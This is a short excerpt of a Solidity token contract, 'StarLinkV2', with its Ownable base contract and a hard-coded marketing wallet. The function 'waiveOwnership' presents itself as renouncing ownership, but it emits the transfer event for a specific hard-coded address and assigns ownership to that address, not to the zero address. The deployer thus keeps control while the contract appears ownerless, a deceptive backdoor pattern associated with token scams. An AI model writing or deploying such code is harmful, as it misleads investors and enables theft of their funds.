...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x72a8dF90986Ca680A6C0f645C8B3E7B476C00172));
        _owner = address(0x72a8dF90986Ca680A6C0f645C8B3E7B476C00172);
    }
...
contract StarLinkV2 is Context, IERC20, Ownable {
    ...
    string private _symbol = "STARLINKV2";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xe78C7109d117F248eD227C95fE2925f85eBb568d);
